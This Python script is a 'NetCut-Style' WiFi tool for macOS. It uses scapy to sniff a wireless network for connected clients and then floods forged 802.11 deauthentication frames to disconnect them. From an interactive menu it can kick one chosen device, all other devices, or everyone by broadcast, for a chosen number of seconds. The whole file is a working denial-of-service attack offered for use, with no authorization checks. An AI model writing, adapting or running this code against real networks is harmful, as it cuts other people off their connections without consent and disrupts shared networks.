#!/usr/bin/env python3
"""
NetCut-Style WiFi Tool for macOS
Discover clients on your network and selectively kick them
"""

from scapy.layers.dot11 import (
    Dot11,
    Dot11Deauth,
    RadioTap,
)
from scapy.sendrecv import sendp, sniff
import os
import subprocess
import threading
import time
import sys
import re


class NetCut:
    def __init__(self):
        self.interface = "en0"
        self.my_mac = None
        self.ap_bssid = None
        self.ap_channel = None
        self.ap_ssid = None
        self.clients = {}  # MAC -> last_seen
        self.running = False
        self.lock = threading.Lock()

    def get_network_info(self):
        """Get current network information from wdutil"""
        print("[*] Getting network information...")
        result = subprocess.run(
            ["sudo", "wdutil", "info"], capture_output=True, text=True
        )
        output = result.stdout

        # Extract BSSID
        bssid_match = re.search(r"BSSID\s+:\s+([0-9a-fA-F:]+)", output)
        if bssid_match:
            self.ap_bssid = bssid_match.group(1)

        # Extract Channel
        channel_match = re.search(r"Channel\s+:\s+([0-9a-z]+)", output)
        if channel_match:
            ch_str = channel_match.group(1)
            # Parse "5g149/80" format
            if "g" in ch_str:
                self.ap_channel = int(ch_str.split("g")[1].split("/")[0])
            else:
                self.ap_channel = int(ch_str.split("/")[0])

        # Extract SSID
        ssid_match = re.search(r"SSID\s+:\s+(.+)", output)
        if ssid_match:
            self.ap_ssid = ssid_match.group(1).strip()

        # Get my MAC
        ifconfig_result = subprocess.run(
            ["ifconfig", self.interface], capture_output=True, text=True
        )
        mac_match = re.search(r"ether\s+([0-9a-fA-F:]+)", ifconfig_result.stdout)
        if mac_match:
            self.my_mac = mac_match.group(1)

        if not all([self.ap_bssid, self.ap_channel, self.my_mac]):
            print(
                "[!] Error: Could not get network information. Are you connected to WiFi?"
            )
            return False

        print(f"[+] Network: {self.ap_ssid}")
        print(f"[+] BSSID: {self.ap_bssid}")
        print(f"[+] Channel: {self.ap_channel}")
        print(f"[+] Your MAC: {self.my_mac}")
        return True

    def set_channel(self):
        """Set interface to the AP's channel"""
        print(f"[*] Setting channel to {self.ap_channel}...")
        airport_path = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
        subprocess.run(
            ["sudo", airport_path, self.interface, f"--channel={self.ap_channel}"],
            capture_output=True,
        )

    def packet_handler(self, pkt):
        """Handle captured packets to discover clients"""
        if not pkt.haslayer(Dot11):
            return

        # Only process packets for our AP
        if pkt.addr3 != self.ap_bssid:
            return

        current_time = time.time()

        # Check addr1 (destination)
        if (
            pkt.addr1
            and pkt.addr1 != "ff:ff:ff:ff:ff:ff"
            and pkt.addr1 != self.ap_bssid
            and pkt.addr1 != self.my_mac
        ):
            with self.lock:
                if pkt.addr1 not in self.clients:
                    print(f"[+] New client discovered: {pkt.addr1}")
                self.clients[pkt.addr1] = current_time

        # Check addr2 (source)
        if (
            pkt.addr2
            and pkt.addr2 != "ff:ff:ff:ff:ff:ff"
            and pkt.addr2 != self.ap_bssid
            and pkt.addr2 != self.my_mac
        ):
            with self.lock:
                if pkt.addr2 not in self.clients:
                    print(f"[+] New client discovered: {pkt.addr2}")
                self.clients[pkt.addr2] = current_time

    def discover_clients(self, duration=30):
        """Sniff network to discover connected clients"""
        print(f"[*] Discovering clients for {duration} seconds...")
        print("[*] Tip: Generate traffic on other devices to discover them faster")

        self.running = True
        sniff(
            iface=self.interface, prn=self.packet_handler, timeout=duration, store=False
        )

        with self.lock:
            print(f"\n[+] Discovered {len(self.clients)} clients:")
            for i, (mac, last_seen) in enumerate(self.clients.items(), 1):
                age = time.time() - last_seen
                print(f"    {i}. {mac} (last seen {age:.1f}s ago)")

        return len(self.clients) > 0

    def kick_client(self, target_mac, duration=60):
        """Kick a specific client by sending deauth packets"""
        print(f"\n[*] Kicking {target_mac} for {duration} seconds...")

        # Create deauth packets (bidirectional for better effect)
        pkt_to_client = (
            RadioTap()
            / Dot11(addr1=target_mac, addr2=self.ap_bssid, addr3=self.ap_bssid)
            / Dot11Deauth(reason=7)
        )

        pkt_to_ap = (
            RadioTap()
            / Dot11(addr1=self.ap_bssid, addr2=target_mac, addr3=self.ap_bssid)
            / Dot11Deauth(reason=7)
        )

        start_time = time.time()
        count = 0

        try:
            while time.time() - start_time < duration:
                sendp(pkt_to_client, iface=self.interface, verbose=False)
                sendp(pkt_to_ap, iface=self.interface, verbose=False)
                count += 2

                if count % 20 == 0:
                    elapsed = time.time() - start_time
                    print(
                        f"[*] Sent {count} packets ({elapsed:.1f}s elapsed)...",
                        end="\r",
                    )

                time.sleep(0.1)
        except KeyboardInterrupt:
            print("\n[*] Stopped by user")

        print(f"\n[+] Attack complete. Sent {count} deauth packets")

    def kick_all_except_me(self, duration=60):
        """Kick all clients except yourself"""
        if not self.clients:
            print("[!] No clients to kick")
            return

        print(f"\n[*] Kicking {len(self.clients)} clients for {duration} seconds...")
        print("[*] Press Ctrl+C to stop")

        start_time = time.time()
        count = 0

        try:
            while time.time() - start_time < duration:
                with self.lock:
                    for target_mac in list(self.clients.keys()):
                        pkt_to_client = (
                            RadioTap()
                            / Dot11(
                                addr1=target_mac,
                                addr2=self.ap_bssid,
                                addr3=self.ap_bssid,
                            )
                            / Dot11Deauth(reason=7)
                        )

                        pkt_to_ap = (
                            RadioTap()
                            / Dot11(
                                addr1=self.ap_bssid,
                                addr2=target_mac,
                                addr3=self.ap_bssid,
                            )
                            / Dot11Deauth(reason=7)
                        )

                        sendp(pkt_to_client, iface=self.interface, verbose=False)
                        sendp(pkt_to_ap, iface=self.interface, verbose=False)
                        count += 2

                if count % 50 == 0:
                    elapsed = time.time() - start_time
                    print(
                        f"[*] Sent {count} packets to {len(self.clients)} clients ({elapsed:.1f}s)...",
                        end="\r",
                    )

                time.sleep(0.1)
        except KeyboardInterrupt:
            print("\n[*] Stopped by user")

        print(f"\n[+] Attack complete. Sent {count} deauth packets")

    def interactive_menu(self):
        """Interactive menu for selecting actions"""
        while True:
            print("\n" + "=" * 50)
            print("NetCut - WiFi Client Manager")
            print("=" * 50)

            with self.lock:
                if self.clients:
                    print(f"\nConnected Clients ({len(self.clients)}):")
                    for i, mac in enumerate(self.clients.keys(), 1):
                        print(f"  {i}. {mac}")
                else:
                    print("\nNo clients discovered yet")

            print("\nOptions:")
            print("  1. Discover/Refresh clients")
            print("  2. Kick specific client")
            print("  3. Kick ALL clients (except you)")
            print("  4. Kick everyone (broadcast)")
            print("  0. Exit")

            choice = input("\nEnter choice: ").strip()

            if choice == "1":
                self.discover_clients(duration=30)

            elif choice == "2":
                if not self.clients:
                    print("[!] No clients available. Discover clients first.")
                    continue

                with self.lock:
                    client_list = list(self.clients.keys())

                try:
                    idx = (
                        int(input(f"Enter client number (1-{len(client_list)}): ")) - 1
                    )
                    if 0 <= idx < len(client_list):
                        duration = int(
                            input("Duration in seconds (default 60): ") or "60"
                        )
                        self.kick_client(client_list[idx], duration)
                    else:
                        print("[!] Invalid selection")
                except ValueError:
                    print("[!] Invalid input")

            elif choice == "3":
                duration = int(input("Duration in seconds (default 60): ") or "60")
                self.kick_all_except_me(duration)

            elif choice == "4":
                duration = int(input("Duration in seconds (default 60): ") or "60")
                print("\n[!] WARNING: This will kick EVERYONE including you!")
                confirm = input("Continue? (yes/no): ")
                if confirm.lower() == "yes":
                    self.kick_broadcast(duration)

            elif choice == "0":
                print("[*] Exiting...")
                break

            else:
                print("[!] Invalid choice")

    def kick_broadcast(self, duration=60):
        """Kick everyone using broadcast"""
        print(f"\n[*] Broadcasting deauth for {duration} seconds...")

        pkt = (
            RadioTap()
            / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.ap_bssid, addr3=self.ap_bssid)
            / Dot11Deauth(reason=7)
        )

        start_time = time.time()
        count = 0

        try:
            while time.time() - start_time < duration:
                sendp(pkt, iface=self.interface, verbose=False)
                count += 1

                if count % 100 == 0:
                    elapsed = time.time() - start_time
                    print(f"[*] Sent {count} packets ({elapsed:.1f}s)...", end="\r")

                time.sleep(0.05)
        except KeyboardInterrupt:
            print("\n[*] Stopped by user")

        print(f"\n[+] Attack complete. Sent {count} deauth packets")


def main():
    if os.geteuid() != 0:
        print("[!] This script requires root privileges")
        print("[*] Please run with: sudo python3 netcut.py")
        sys.exit(1)

    netcut = NetCut()

    # Get network info
    if not netcut.get_network_info():
        sys.exit(1)

    # Set channel
    netcut.set_channel()

    # Run interactive menu
    netcut.interactive_menu()


if __name__ == "__main__":
    main()
